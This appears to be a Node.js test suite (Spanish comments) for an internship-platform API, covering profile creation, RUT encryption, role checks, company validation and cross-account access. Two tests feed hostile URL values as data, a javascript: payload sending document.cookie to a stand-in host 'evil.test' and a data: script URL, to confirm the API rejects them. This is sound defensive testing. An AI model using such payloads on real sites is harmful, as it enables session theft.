const { test, describe, after } = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');
const app = require('../src/app');
const { sequelize, Usuario, Estudiante, Empresa, Oferta } = require('../src/models');
const { borrarUsuariosDePrueba } = require('./limpiar');
const tokensService = require('../src/services/auth/tokens');
const passwords = require('../src/services/auth/passwords');
const { normalizarRut } = require('../src/utils/rut');

// Dominio propio, distinto del de auth.test.js: node --test corre los archivos en paralelo contra
// la misma base, así que si dos archivos comparten dominio, el after() de uno borra a mitad de
// prueba los usuarios que el otro todavía está usando.
const DOMINIO_PRUEBA = 'perfiles.uahurtado.test';
let contador = 0;
const correoUnico = (prefijo) => `${prefijo}.${Date.now()}.${contador++}@${DOMINIO_PRUEBA}`;

// RUT inventado con dígito verificador válido (algoritmo módulo 11), nunca uno real.
// Aleatorio, no un contador: un contador que reinicia en cada corrida repite los mismos RUT que una
// corrida anterior haya dejado en la base (si su after() no alcanzó a limpiar), y choca contra ellos.
const generarRutValido = () => {
  const cuerpo = String(10000000 + Math.floor(Math.random() * 89999999));
  let suma = 0;
  let mult = 2;
  for (let i = cuerpo.length - 1; i >= 0; i--) {
    suma += Number(cuerpo[i]) * mult;
    mult = mult === 7 ? 2 : mult + 1;
  }
  const resto = 11 - (suma % 11);
  const dv = resto === 11 ? '0' : resto === 10 ? 'K' : String(resto);
  return `${cuerpo}-${dv}`;
};

const crearUsuarioActivo = async (rol) => {
  const email = correoUnico(rol);
  const passwordHash = await passwords.hashear('claveDePrueba123456');
  const usuario = await Usuario.create({ email, passwordHash, rol, estado: 'activo', emailVerificadoAt: new Date() });
  const accessToken = tokensService.firmarAcceso({ sub: String(usuario.id), rol });
  return { usuario, accessToken };
};

const datosEstudiante = (overrides = {}) => ({
  nombres: 'Ana',
  apellidos: 'Prueba',
  rut: generarRutValido(),
  carrera: 'Contador Auditor',
  nivel: 5,
  telefono: '+56900000000',
  ...overrides,
});

const datosEmpresa = (overrides = {}) => ({
  razonSocial: 'Empresa de Prueba SpA',
  rutEmpresa: generarRutValido(),
  giro: 'Servicios',
  sitioWeb: 'https://empresa-de-prueba.test',
  comuna: 'Santiago',
  contactoNombre: 'Contacto Prueba',
  contactoCargo: 'RR.HH.',
  ...overrides,
});

after(async () => {
  await borrarUsuariosDePrueba(DOMINIO_PRUEBA);
  await sequelize.close();
});

describe('POST /estudiantes/perfil', () => {
  test('crea el perfil y nunca devuelve el RUT en texto plano', async () => {
    const { accessToken } = await crearUsuarioActivo('estudiante');
    const respuesta = await request(app)
      .post('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${accessToken}`)
      .send(datosEstudiante());

    assert.equal(respuesta.status, 201);
    assert.equal(respuesta.body.rut, undefined);
    assert.equal(JSON.stringify(respuesta.body).includes('rutCifrado'), false);
    assert.equal(typeof respuesta.body.rutUltimos4, 'string');
  });

  test('un segundo perfil responde 409 PERFIL_YA_EXISTE', async () => {
    const { accessToken } = await crearUsuarioActivo('estudiante');
    await request(app).post('/api/v1/estudiantes/perfil').set('Authorization', `Bearer ${accessToken}`).send(datosEstudiante());

    const segunda = await request(app)
      .post('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${accessToken}`)
      .send(datosEstudiante());

    assert.equal(segunda.status, 409);
    assert.equal(segunda.body.error.codigo, 'PERFIL_YA_EXISTE');
  });

  test('un RUT con dígito verificador inválido responde 422 RUT_INVALIDO', async () => {
    const { accessToken } = await crearUsuarioActivo('estudiante');
    const respuesta = await request(app)
      .post('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${accessToken}`)
      .send(datosEstudiante({ rut: '11.111.111-2' }));

    assert.equal(respuesta.status, 422);
    assert.equal(respuesta.body.error.codigo, 'RUT_INVALIDO');
  });

  test('un nivel que desborda int4 responde 422, no 500 (pentester-api)', async () => {
    const { accessToken } = await crearUsuarioActivo('estudiante');
    const respuesta = await request(app)
      .post('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${accessToken}`)
      .send(datosEstudiante({ nivel: 3_000_000_000 }));

    assert.equal(respuesta.status, 422);
    assert.equal(respuesta.body.error.codigo, 'VALIDACION_ENTRADA');
  });
});

describe('acceso cruzado entre estudiantes', () => {
  test('el estudiante A nunca ve ni modifica el perfil del estudiante B', async () => {
    const a = await crearUsuarioActivo('estudiante');
    const b = await crearUsuarioActivo('estudiante');
    await request(app).post('/api/v1/estudiantes/perfil').set('Authorization', `Bearer ${a.accessToken}`).send(datosEstudiante({ nombres: 'Estudiante-A' }));
    await request(app).post('/api/v1/estudiantes/perfil').set('Authorization', `Bearer ${b.accessToken}`).send(datosEstudiante({ nombres: 'Estudiante-B' }));

    const vistaDeA = await request(app).get('/api/v1/estudiantes/perfil').set('Authorization', `Bearer ${a.accessToken}`);
    assert.equal(vistaDeA.body.nombres, 'Estudiante-A');
    assert.notEqual(vistaDeA.body.usuarioId, String(b.usuario.id));

    await request(app)
      .patch('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${a.accessToken}`)
      .send({ nombres: 'A-intenta-editar' });

    const perfilDeB = await Estudiante.findOne({ where: { usuarioId: b.usuario.id } });
    assert.equal(perfilDeB.nombres, 'Estudiante-B');
  });

  test('un usuarioId forjado en el cuerpo del PATCH no cambia el dueño del perfil', async () => {
    const a = await crearUsuarioActivo('estudiante');
    const b = await crearUsuarioActivo('estudiante');
    await request(app).post('/api/v1/estudiantes/perfil').set('Authorization', `Bearer ${a.accessToken}`).send(datosEstudiante());
    await request(app).post('/api/v1/estudiantes/perfil').set('Authorization', `Bearer ${b.accessToken}`).send(datosEstudiante());

    await request(app)
      .patch('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${a.accessToken}`)
      .send({ usuarioId: String(b.usuario.id), nombres: 'Deberia-quedar-en-A' });

    const perfilDeA = await Estudiante.findOne({ where: { usuarioId: a.usuario.id } });
    const perfilDeB = await Estudiante.findOne({ where: { usuarioId: b.usuario.id } });
    assert.equal(perfilDeA.nombres, 'Deberia-quedar-en-A');
    assert.notEqual(perfilDeB.nombres, 'Deberia-quedar-en-A');
  });
});

describe('POST /empresas/perfil y validación', () => {
  test('crea el perfil de empresa como pendiente', async () => {
    const { accessToken } = await crearUsuarioActivo('empresa');
    const respuesta = await request(app)
      .post('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${accessToken}`)
      .send(datosEmpresa());

    assert.equal(respuesta.status, 201);
    assert.equal(respuesta.body.estadoValidacion, 'pendiente');
  });

  test('un rut_empresa ya usado por otra empresa responde 409', async () => {
    const rutCompartido = generarRutValido();
    const a = await crearUsuarioActivo('empresa');
    const b = await crearUsuarioActivo('empresa');
    await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${a.accessToken}`).send(datosEmpresa({ rutEmpresa: rutCompartido }));

    const segunda = await request(app)
      .post('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${b.accessToken}`)
      .send(datosEmpresa({ rutEmpresa: rutCompartido }));

    assert.equal(segunda.status, 409);
  });

  test('un sitioWeb con esquema javascript: se rechaza con 422 (auditoría de Fase 6)', async () => {
    const { accessToken } = await crearUsuarioActivo('empresa');
    const respuesta = await request(app)
      .post('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${accessToken}`)
      .send(datosEmpresa({ sitioWeb: "javascript:fetch('https://evil.test/r?c='+document.cookie)" }));

    assert.equal(respuesta.status, 422);
  });

  test('un sitioWeb sin http/https se rechaza también al editar', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const edicion = await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({ sitioWeb: 'data:text/html,<script>alert(1)</script>' });

    assert.equal(edicion.status, 422);
  });

  test('coordinación valida una empresa pendiente', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const respuesta = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/validacion`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`);

    assert.equal(respuesta.status, 200);
    assert.equal(respuesta.body.estadoValidacion, 'validada');
    assert.equal(respuesta.body.validadaPorUsuarioId, String(coordinacion.usuario.id));
    assert.ok(respuesta.body.validadaAt);
  });

  test('rechazar sin motivo responde 422', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const respuesta = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/rechazo`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({});

    assert.equal(respuesta.status, 422);
  });

  test('rechazar con un motivo de solo espacios responde 422, igual que sin motivo (auditoría del panel de coordinación)', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const respuesta = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/rechazo`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({ motivoRechazo: '   ' });

    assert.equal(respuesta.status, 422);
  });

  test('rechazar con motivo deja la empresa rechazada, y editar el perfil la regresa a pendiente', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const rechazo = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/rechazo`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({ motivoRechazo: 'Faltan datos de contacto' });

    assert.equal(rechazo.status, 200);
    assert.equal(rechazo.body.estadoValidacion, 'rechazada');
    assert.equal(rechazo.body.motivoRechazo, 'Faltan datos de contacto');

    const edicion = await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({ contactoNombre: 'Nuevo contacto' });

    assert.equal(edicion.status, 200);
    assert.equal(edicion.body.estadoValidacion, 'pendiente');
  });

  test('validar una empresa ya validada responde 409 EMPRESA_TRANSICION_INVALIDA', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);

    const segunda = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/validacion`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`);

    assert.equal(segunda.status, 409);
    assert.equal(segunda.body.error.codigo, 'EMPRESA_TRANSICION_INVALIDA');
  });

  test('un estudiante no puede ver la cola de empresas pendientes', async () => {
    const { accessToken } = await crearUsuarioActivo('estudiante');
    const respuesta = await request(app).get('/api/v1/empresas/pendientes').set('Authorization', `Bearer ${accessToken}`);
    assert.equal(respuesta.status, 403);
  });

  test('una empresa no puede validarse ni rechazarse a sí misma', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const validacion = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/validacion`)
      .set('Authorization', `Bearer ${empresa.accessToken}`);
    const rechazo = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/rechazo`)
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({ motivoRechazo: 'x' });

    assert.equal(validacion.status, 403);
    assert.equal(rechazo.status, 403);
  });

  test('un PATCH vacío sobre una empresa rechazada no la reencola', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
    await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/rechazo`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({ motivoRechazo: 'Motivo original' });

    const patchVacio = await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({});

    assert.equal(patchVacio.body.estadoValidacion, 'rechazada');
    assert.equal(patchVacio.body.motivoRechazo, 'Motivo original');
  });

  test('cambiar el RUT o la razón social de una empresa validada la manda de vuelta a pendiente', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);

    const edicion = await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({ razonSocial: 'Nueva Razón Social Post-Validación' });

    assert.equal(edicion.status, 200);
    assert.equal(edicion.body.estadoValidacion, 'pendiente');
    assert.equal(edicion.body.validadaPorUsuarioId, null);

    // editar un dato de contacto que no es de identidad, en cambio, no debe tocar el estado
    const segundaValidacion = await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);
    assert.equal(segundaValidacion.status, 200);
    const edicionDeContacto = await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({ contactoNombre: 'Otro contacto' });
    assert.equal(edicionDeContacto.body.estadoValidacion, 'validada');
  });

  test('cambiar la razón social cierra en cascada las ofertas publicadas, no solo revierte el estado de la empresa (auditoría de Fase 6)', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);

    const oferta = await request(app)
      .post('/api/v1/ofertas')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({
        titulo: 'Práctica', descripcion: 'd', requisitos: 'r', area: 'x', modalidad: 'remota', jornada: 'completa', remunerada: false,
        fechaCierre: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      });
    await request(app).post(`/api/v1/ofertas/${oferta.body.id}/revision`).set('Authorization', `Bearer ${empresa.accessToken}`);
    await request(app).post(`/api/v1/ofertas/${oferta.body.id}/aprobacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);

    const edicion = await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send({ razonSocial: 'Nueva Identidad Sin Revisar' });
    assert.equal(edicion.body.estadoValidacion, 'pendiente');

    // La vitrina pública nunca debe mostrar la razón social nueva sin revisar, pegada a una oferta
    // que sigue vigente: la oferta ya no puede seguir "publicada".
    const ofertaTrasEdicion = await Oferta.findByPk(oferta.body.id);
    assert.notEqual(ofertaTrasEdicion.estado, 'publicada');

    const listado = await request(app).get('/api/v1/ofertas');
    assert.ok(!listado.body.ofertas.some((o) => o.id === oferta.body.id));
  });

  test('coordinación puede suspender una empresa validada, con motivo obligatorio', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);

    const sinMotivo = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/suspension`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({});
    assert.equal(sinMotivo.status, 422);

    const soloEspacios = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/suspension`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({ motivoSuspension: '   ' });
    assert.equal(soloEspacios.status, 422, 'un motivo de solo espacios no debe pasar (auditoría del panel de coordinación)');

    const conMotivo = await request(app)
      .post(`/api/v1/empresas/${creada.body.id}/suspension`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`)
      .send({ motivoSuspension: 'Datos de identidad no verificables' });
    assert.equal(conMotivo.status, 200);
    assert.equal(conMotivo.body.estadoValidacion, 'suspendida');
  });

  test('dos coordinadores validando y rechazando la misma empresa a la vez: uno gana, el otro 409 (auditoría del panel de coordinación)', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());

    const [validacion, rechazo] = await Promise.all([
      request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`),
      request(app)
        .post(`/api/v1/empresas/${creada.body.id}/rechazo`)
        .set('Authorization', `Bearer ${coordinacion.accessToken}`)
        .send({ motivoRechazo: 'Datos insuficientes' }),
    ]);

    const estados = [validacion.status, rechazo.status].sort();
    assert.deepEqual(estados, [200, 409]);

    // El estado final es uno de los dos, nunca una mezcla (p. ej. "validada" con motivoRechazo puesto).
    const final = await Empresa.findByPk(creada.body.id);
    if (final.estadoValidacion === 'validada') assert.equal(final.motivoRechazo, null);
    else assert.equal(final.estadoValidacion, 'rechazada');
  });

  test('un id de empresa con formato inválido responde 422, no 500', async () => {
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const respuesta = await request(app)
      .post('/api/v1/empresas/no-es-un-id/validacion')
      .set('Authorization', `Bearer ${coordinacion.accessToken}`);
    assert.equal(respuesta.status, 422);
  });
});

describe('acceso cruzado entre empresas', () => {
  test('la empresa A nunca ve ni modifica el perfil de la empresa B', async () => {
    const a = await crearUsuarioActivo('empresa');
    const b = await crearUsuarioActivo('empresa');
    await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${a.accessToken}`).send(datosEmpresa({ razonSocial: 'Empresa-A' }));
    await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${b.accessToken}`).send(datosEmpresa({ razonSocial: 'Empresa-B' }));

    const vistaDeA = await request(app).get('/api/v1/empresas/perfil').set('Authorization', `Bearer ${a.accessToken}`);
    assert.equal(vistaDeA.body.razonSocial, 'Empresa-A');

    await request(app)
      .patch('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${a.accessToken}`)
      .send({ razonSocial: 'A-intenta-editar' });

    const perfilDeB = await Empresa.findOne({ where: { usuarioId: b.usuario.id } });
    assert.equal(perfilDeB.razonSocial, 'Empresa-B');
  });
});

describe('GET /empresas/:id (perfil público)', () => {
  test('una empresa validada responde con la lista blanca de campos públicos', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creada = await request(app)
      .post('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${empresa.accessToken}`)
      .send(datosEmpresa({ razonSocial: 'Empresa Pública SpA' }));
    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);

    const respuesta = await request(app).get(`/api/v1/empresas/${creada.body.id}`);
    assert.equal(respuesta.status, 200);
    assert.equal(respuesta.body.razonSocial, 'Empresa Pública SpA');
    assert.deepEqual(Object.keys(respuesta.body).sort(), ['comuna', 'giro', 'id', 'razonSocial', 'sitioWeb']);
  });

  test('una empresa pendiente, rechazada o suspendida responde 404, igual que si no existiera', async () => {
    for (const estadoValidacion of ['pendiente', 'rechazada', 'suspendida']) {
      const usuario = await crearUsuarioActivo('empresa');
      const perfil = await Empresa.create({
        usuarioId: usuario.usuario.id,
        razonSocial: 'Empresa no pública',
        rutEmpresa: generarRutValido().replace(/[.\-]/g, ''),
        contactoNombre: 'x',
        contactoCargo: 'x',
        estadoValidacion,
      });
      const respuesta = await request(app).get(`/api/v1/empresas/${perfil.id}`);
      assert.equal(respuesta.status, 404, `estadoValidacion=${estadoValidacion}`);
    }
  });

  test('un id que no existe responde 404', async () => {
    const respuesta = await request(app).get('/api/v1/empresas/9999999');
    assert.equal(respuesta.status, 404);
  });
});

describe('GET /empresas (listado completo, coordinación) — Fase 6, panel de coordinación', () => {
  test('coordinación ve empresas en cualquier estado, no solo pendientes', async () => {
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const pendiente = await crearUsuarioActivo('empresa');
    const creada = await request(app)
      .post('/api/v1/empresas/perfil')
      .set('Authorization', `Bearer ${pendiente.accessToken}`)
      .send(datosEmpresa({ razonSocial: 'Empresa Pendiente Para Listado' }));

    const respuesta = await request(app).get('/api/v1/empresas').set('Authorization', `Bearer ${coordinacion.accessToken}`);
    assert.equal(respuesta.status, 200);
    const fila = respuesta.body.find((e) => e.id === creada.body.id);
    assert.equal(fila.estadoValidacion, 'pendiente');
  });

  test('una empresa no puede listar todas las empresas: 403', async () => {
    const empresa = await crearUsuarioActivo('empresa');
    const respuesta = await request(app).get('/api/v1/empresas').set('Authorization', `Bearer ${empresa.accessToken}`);
    assert.equal(respuesta.status, 403);
  });
});

describe('GET /estudiantes/:id/rut', () => {
  test('coordinación descifra el RUT correctamente', async () => {
    const rut = generarRutValido();
    const estudiante = await crearUsuarioActivo('estudiante');
    const coordinacion = await crearUsuarioActivo('coordinacion');
    const creado = await request(app)
      .post('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${estudiante.accessToken}`)
      .send(datosEstudiante({ rut }));

    const respuesta = await request(app)
      .get(`/api/v1/estudiantes/${creado.body.id}/rut`)
      .set('Authorization', `Bearer ${coordinacion.accessToken}`);

    assert.equal(respuesta.status, 200);
    assert.equal(respuesta.body.rut, normalizarRut(rut));
  });

  test('un rol distinto de coordinación recibe 403', async () => {
    const rut = generarRutValido();
    const estudiante = await crearUsuarioActivo('estudiante');
    const otraEmpresa = await crearUsuarioActivo('empresa');
    const creado = await request(app)
      .post('/api/v1/estudiantes/perfil')
      .set('Authorization', `Bearer ${estudiante.accessToken}`)
      .send(datosEstudiante({ rut }));

    const respuesta = await request(app)
      .get(`/api/v1/estudiantes/${creado.body.id}/rut`)
      .set('Authorization', `Bearer ${otraEmpresa.accessToken}`);

    assert.equal(respuesta.status, 403);
  });

  test('un id con formato inválido responde 422, no 500', async () => {
    const { accessToken } = await crearUsuarioActivo('coordinacion');
    const respuesta = await request(app).get('/api/v1/estudiantes/no-es-un-id/rut').set('Authorization', `Bearer ${accessToken}`);
    assert.equal(respuesta.status, 422);
  });

  test('un id numérico que no corresponde a nadie responde 404', async () => {
    const { accessToken } = await crearUsuarioActivo('coordinacion');
    const respuesta = await request(app).get('/api/v1/estudiantes/999999999/rut').set('Authorization', `Bearer ${accessToken}`);
    assert.equal(respuesta.status, 404);
  });
});
